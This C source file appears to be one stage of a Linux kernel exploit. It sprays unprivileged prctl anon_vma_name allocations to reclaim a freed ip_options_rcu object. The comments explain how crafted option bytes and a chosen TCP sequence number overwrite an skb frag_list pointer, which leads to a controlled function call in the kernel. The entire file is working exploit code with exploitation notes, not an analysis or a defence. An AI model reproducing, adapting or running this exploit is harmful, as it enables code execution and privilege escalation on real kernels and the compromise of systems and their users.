/* avnspray.c - reclaim the freed ip_options_rcu via anon_vma_name.
 *
 * struct anon_vma_name { struct kref kref; char name[]; }  (name at +4)
 * anon_vma_name_alloc(): kmalloc(4 + strlen(name) + 1, GFP_KERNEL), then
 * memcpy the name; the object is held by the VMA until replaced.
 * prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, addr, len, name) is available to
 * unprivileged tasks.  Name bytes must be printable ASCII 0x20..0x7e
 * (minus \ ` $ [ ]) and contain no NUL, so the fake ip_options uses only
 * printable bytes.
 *
 * This payload stages the frag_list call (RCE):
 *   optlen=40 srr=67 rr=68 ts=69 flags=0x28 (rr_needaddr|ts_needaddr)
 *   faddr=32.32.32.32 (local route)  __data = valid printable TS option.
 *
 * With the client ISN chosen so the SYN-ACK ACK field bytes are
 *   iph[68]=109 iph[70]=113 iph[71]=100
 * the three ip_options_build writes land at:
 *   srr:  67 + 109 - 4 = 172 = shinfo+8  (frag_list low)  value = daddr = X
 *   rr:   68 + 113 - 5 = 176 = shinfo+12 (frag_list high) value = iph->saddr = Y
 *   ts:   69 + 100 - 9 = 160             (tailroom, harmless)          value = Y
 * and skb_release_data() -> kfree_skb_list_reason(frag_list) walks our fake
 * skb (in a user page at the physmap alias printed by rce_prep) and calls
 * skb->destructor(skb) = _printk(fake_skb) with %rdi fully controlled.
 *
 * Usage: ./avnspray <runtime_s> [cpu]
 */
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <time.h>
#include <unistd.h>

#ifndef PR_SET_VMA
#define PR_SET_VMA 0x53564d41
#endif
#define PR_SET_VMA_ANON_NAME 0

#define NAMELEN 79

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) { perror("mmap"); return 1; }
    if (*(volatile char *)p == 0x7f) { /* fault the page in */ }

    /* fake ip_options_rcu at object offset 4 (name[0]) */
    char name[NAMELEN + 1];
    memset(name, 'A', NAMELEN);
    name[NAMELEN] = 0;
    name[20] = 0x28;  /* optlen = 40   */
    name[21] = 67;     /* srr  = 'C'    */
    name[22] = 68;     /* rr   = 'D'    */
    name[23] = 69;     /* ts   = 'E'    */
    name[24] = 0x28;   /* flags: rr_needaddr(8) | ts_needaddr(0x20) */
    name[12] = 32; name[13] = 32; name[14] = 32; name[15] = 32;  /* faddr 32.32.32.32 */
    /* __data = valid printable TIMESTAMP option (passes RX ip_options_compile):
     * type 0x44 len 0x28 ptr 0x25 flags 0x20 (TSONLY) */
    name[28] = 0x44;
    name[29] = 0x28;
    name[30] = 0x25;
    name[31] = 0x20;
    /* markers: s1 = object[39..42] = name[35..38], s3 = object[47..50] = name[43..46] */
    name[35] = 0x41; name[36] = 0x42; name[37] = 0x43; name[38] = 0x44;  /* 0x44434241 */
    name[43] = 0x45; name[44] = 0x46; name[45] = 0x47; name[46] = 0x48;  /* 0x48474645 */

    unsigned long n = 0, ok = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            if (prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME,
                      (unsigned long)p, 4096UL, (unsigned long)name) == 0)
                ok++;
            n++;
        }
    }
    fprintf(stderr, "[avn] calls=%lu ok=%lu\n", n, ok);
    return 0;
}
